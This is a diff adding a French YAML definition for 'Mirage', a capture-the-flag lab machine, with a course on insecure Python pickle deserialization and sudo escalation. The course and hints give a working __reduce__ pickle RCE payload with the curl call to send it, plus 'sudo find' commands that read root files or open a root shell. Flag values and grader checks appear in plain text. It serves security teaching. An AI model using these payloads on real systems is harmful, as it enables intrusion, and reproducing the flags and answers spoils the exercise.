@@ -1,0 +1,116 @@
+title: Mirage
+track: offensif
+machine_os: linux
+level: avance
+order: 4
+tags: [machine, web, désérialisation, pickle, insecure deserialization, rce, élévation de privilèges, sudo, linux, cve]
+summary: Machine Difficile Linux - l'application restaure des préférences via un pickle fourni par le client (désérialisation non sécurisée), ce qui donne l'exécution de code, puis un sudo find mal configuré mène à root. Capture le drapeau utilisateur puis le drapeau root.
+compose: docker-compose.yml
+service: attaquant
+shell: bash
+flags:
+  user: "TDM{m1r4g3_p1ckl3_d3s3r1al1z4t10n}"
+  root: "TDM{m1r4g3_sud0_f1nd_r00t}"
+description: |
+  **Machine : Mirage · Difficile · 🐧 Linux**
+
+  La cible héberge « Mirage Dashboard », qui **restaure tes préférences** à partir d'un jeton sérialisé
+  (base64) que *tu* fournis. Comme sur une machine Hack The Box, pars de la reconnaissance, comprends le
+  format du jeton, et sers-t'en pour exécuter du code. Objectif : drapeau **utilisateur** (`user.txt`)
+  puis élévation vers le drapeau **root** (`root.txt`).
+
+  La **cible** est isolée sur le réseau interne du lab : elle ne peut rien atteindre à l'extérieur. **Réinitialiser** reconstruit une cible neuve.
+
+  **Pistes.**
+
+  1. Reconnaissance : `curl http://cible/` - le jeton `data` est du **base64**. Décode-le : c'est un
+     objet Python **pickle**.
+  2. Si le serveur fait `pickle.loads` sur une donnée que tu contrôles, tu peux forger un objet dont la
+     **désérialisation exécute une commande** (méthode `__reduce__`). C'est une *insecure deserialization*.
+  3. Forge le jeton depuis ce poste (`python3`), envoie-le à `/charger`, récupère la sortie : tu agis en
+     tant que `app`. Lis `user.txt`.
+  4. `sudo -l` : le service peut lancer un binaire en root sans mot de passe. Sur *GTFOBins*, il permet
+     de lire un fichier en root : c'est ton chemin vers `root.txt`.
+
+  Outils : `curl`, `python3`, `base64`, `nmap`.
+cours: |
+  ## Désérialisation non sécurisée (insecure deserialization) et élévation par sudo
+
+  ### Désérialisation non sécurisée
+
+  **Sérialiser** transforme un objet en octets ; **désérialiser** reconstruit l'objet. Avec le `pickle`
+  de Python (comme avec la sérialisation Java, PHP, .NET...), la reconstruction peut **appeler du code** :
+  un objet peut définir `__reduce__` qui renvoie une fonction et ses arguments, exécutés au chargement.
+  Donc **désérialiser une donnée contrôlée par l'attaquant = exécution de code**. C'est l'une des failles
+  les plus répandues (OWASP Top 10). CVE marquantes de cette famille :
+
+  - **CVE-2015-7501** (Java / Apache Commons Collections) : désérialisation RCE qui a touché des serveurs
+    d'applications entiers (WebLogic, JBoss...).
+  - **CVE-2017-5941** (`node-serialize`, Node.js) et **CVE-2019-6446** (NumPy `pickle`) : même classe de
+    faille dans d'autres écosystèmes.
+
+  Ici l'application fait `pickle.loads(base64decode(data))`. On forge l'objet malveillant depuis le poste
+  d'attaque :
+
+  ```
+  python3 - <<'PY'
+  import base64, pickle, subprocess
+  class E:
+      def __reduce__(self):
+          return (subprocess.check_output, (["cat", "/home/app/user.txt"],))
+  print(base64.b64encode(pickle.dumps(E())).decode())
+  PY
+  ```
+
+  puis on envoie le jeton : `curl -s -G http://cible/charger --data-urlencode "data=<jeton>"`. Le serveur
+  renvoie la sortie de la commande (ici le drapeau), exécutée en tant que `app`.
+
+  ### Élévation de privilèges par sudo (GTFOBins)
+
+  `sudo -l` montre `(root) NOPASSWD: /usr/bin/find`. `find` peut exécuter une commande (*GTFOBins*) :
+
+  ```
+  sudo find /root/root.txt -exec cat {} \;
+  sudo find . -exec /bin/sh \; -quit        # (shell root complet)
+  ```
+
+  ### Côté défense
+
+  Ne jamais désérialiser une donnée non fiable : préférer des formats de données **sans code** (JSON) avec
+  validation de schéma, ou signer/chiffrer les jetons. Et ne jamais accorder de `sudo NOPASSWD` sur un
+  binaire capable d'exécuter des commandes.
+docs:
+  - title: OWASP - Deserialization of untrusted data
+    url: https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data
+  - title: GTFOBins - find
+    url: https://gtfobins.github.io/gtfobins/find/
+exercises:
+  - id: reconnaissance
+    title: Comprendre le jeton
+    description: |
+      Récupère la page d'accueil et **décode** le jeton `data` d'exemple pour confirmer qu'il s'agit d'un
+      objet sérialisé. Enregistre la page dans `/root/reponses/accueil.html`.
+    hint: "curl -s http://cible/ | tee /root/reponses/accueil.html   # puis décode la valeur de data en base64"
+    cours: |
+      Reconnaître que le jeton est du base64 d'un pickle est la clé : à partir du moment où tu contrôles
+      une donnée désérialisée côté serveur, tu peux viser l'exécution de code.
+    checks:
+      - desc: La page de la cible a été récupérée
+        run: grep -qi 'Mirage' /root/reponses/accueil.html
+  - id: deserialisation
+    title: RCE par désérialisation
+    description: |
+      Forge un jeton `pickle` dont le chargement exécute `id` **sur la cible**, envoie-le à `/charger` et
+      enregistre la sortie (`uid=...(app)`) dans `/root/reponses/deser.txt`.
+    hint: |
+      T=$(python3 -c "import base64,pickle,subprocess;
+      class E:
+       def __reduce__(self): return (subprocess.check_output,(['id'],))
+      print(base64.b64encode(pickle.dumps(E())).decode())")
+      curl -s -G http://cible/charger --data-urlencode "data=$T" | tee /root/reponses/deser.txt
+    cours: |
+      La sortie de `id` prouve l'exécution de code via la désérialisation et t'indique l'utilisateur de
+      service (`app`). De là tu lis `user.txt`, puis tu cherches l'élévation de privilèges avec `sudo -l`.
+    checks:
+      - desc: La désérialisation exécute du code en tant que app
+        run: grep -q 'uid=' /root/reponses/deser.txt && grep -q 'app' /root/reponses/deser.txt
